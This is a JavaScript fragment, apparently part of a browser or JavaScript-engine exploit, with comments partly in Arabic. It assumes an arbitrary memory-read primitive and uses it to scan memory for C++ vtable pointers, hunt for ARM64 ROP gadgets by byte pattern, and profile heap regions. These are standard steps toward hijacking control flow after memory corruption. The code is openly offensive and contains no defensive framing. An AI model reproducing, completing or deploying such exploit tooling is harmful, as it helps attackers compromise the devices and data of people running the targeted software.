// ============================================================
// MEMORY SCANNER CORE
// ============================================================

function isPlausiblePointer(ptr) {
    return (ptr > PLAUSIBLE_LIB_BASE_MIN) 
        && (ptr < PLAUSIBLE_LIB_BASE_MAX)
        && ((ptr & 7) === 0);  // 8-byte aligned
}

function isPlausibleVtable(ptr) {
    return isPlausiblePointer(ptr)
        && ((ptr & 0xFFF) === 0x20 || (ptr & 0xFFF) === 0x30 || (ptr & 0xFFF) === 0x40);
}

// البحث عن vtable pointers في منطقة الذاكرة
function scanForVtables(startAddr, size) {
    log("SCAN", "Starting vtable scan from " + hex(startAddr) + " size=" + hex(size));
    
    var found = [];
    var endAddr = startAddr + size;
    
    for (var addr = startAddr; addr < endAddr; addr += 8) {
        try {
            var ptr = readQword(addr);
            if (isPlausibleVtable(ptr)) {
                // تحقق إضافي: هل الـ vtable يشير إلى منطقة executable؟
                var vtableEntry = readQword(ptr);
                if (isPlausiblePointer(vtableEntry)) {
                    found.push({
                        offset: addr - startAddr,
                        vtable: ptr,
                        firstEntry: vtableEntry
                    });
                    
                    if (found.length >= 50) {
                        log("SCAN", "Found 50+ vtables, stopping early");
                        break;
                    }
                }
            }
        } catch(e) {
            // تجاهل العناوين غير الصالحة
        }
        
        // Progress every 0x10000
        if ((addr & 0xFFFF) === 0) {
            log("PROGRESS", "Scanned " + hex(addr - startAddr));
        }
    }
    
    return found;
}

var KNOWN_GADGETS = [

    { name: "nop_ret",   pattern: [0x1f, 0x20, 0x03, 0xd5, 0xc0, 0x03, 0x5f, 0xd6] }, // nop; ret
    { name: "x0_x1",     pattern: [0xe0, 0x03, 0x01, 0xaa] },           // mov x0, x1
    { name: "x0_0",      pattern: [0x00, 0x00, 0x80, 0xd2] },           // movz x0, #0
    { name: "blr_x0",    pattern: [0x00, 0x00, 0x3f, 0xd6] },           // blr x0
    { name: "br_x0",     pattern: [0x00, 0x00, 0x1f, 0xd6] },           // br x0
    { name: "ldr_x0_sp", pattern: [0xe0, 0x03, 0x40, 0xf9] },           // ldr x0, [sp]
    { name: "str_x0_sp", pattern: [0xe0, 0x03, 0x00, 0xf9] },           // str x0, [sp]
];

function findGadgets(baseAddr, size) {
    log("GADGET", "Hunting for ROP gadgets in " + hex(baseAddr) + "-" + hex(baseAddr+size));
    
    var found = [];
    
    for (var addr = baseAddr; addr < baseAddr + size; addr += 4) {
        try {
            var qword = readQword(addr);
            var bytes = [
                qword & 0xFF, (qword >> 8) & 0xFF,
                (qword >> 16) & 0xFF, (qword >> 24) & 0xFF,
                (qword >> 32) & 0xFF, (qword >> 40) & 0xFF,
                (qword >> 48) & 0xFF, (qword >> 56) & 0xFF
            ];
            
            for (var g = 0; g < KNOWN_GADGETS.length; g++) {
                var gadget = KNOWN_GADGETS[g];
                var match = true;
                
                for (var b = 0; b < gadget.pattern.length; b++) {
                    if (bytes[b] !== gadget.pattern[b]) {
                        match = false;
                        break;
                    }
                }
                
                if (match) {
                    found.push({ name: gadget.name, addr: addr });
                    log("FOUND", "Gadget " + gadget.name + " @ " + hex(addr));
                    
                    if (found.length >= 20) {
                        log("GADGET", "Found 20 gadgets, pausing...");
                        return found;
                    }
                }
            }
        } catch(e) {}
    }
    
    return found;
}

// ============================================================

function analyzeHeapRegion(baseAddr, size) {
    log("HEAP", "Analyzing heap region " + hex(baseAddr) + "-" + hex(baseAddr+size));
    
    var stats = {
        nullPages: 0,
        pointers: 0,
        vtables: 0,
        strings: 0,
        patterns: []
    };
    
    for (var addr = baseAddr; addr < baseAddr + size; addr += 0x1000) {
        try {
            var sample = readQword(addr);
            
            if (sample === 0) {
                stats.nullPages++;
            } else if (isPlausiblePointer(sample)) {
                stats.pointers++;
                if (isPlausibleVtable(sample)) {
                    stats.vtables++;
                }
            } else if ((sample & 0xFFFFFFFF) === 0x6E616C) { // "lan\0" etc
                stats.strings++;
            }
        } catch(e) {
            stats.nullPages++;
        }
    }
    
    log("HEAP-STATS", "Null/Empty: " + stats.nullPages 
        + " | Pointers: " + stats.pointers 
        + " | VTables: " + stats.vtables
        + " | Strings: " + stats.strings);
    
    return stats;
}
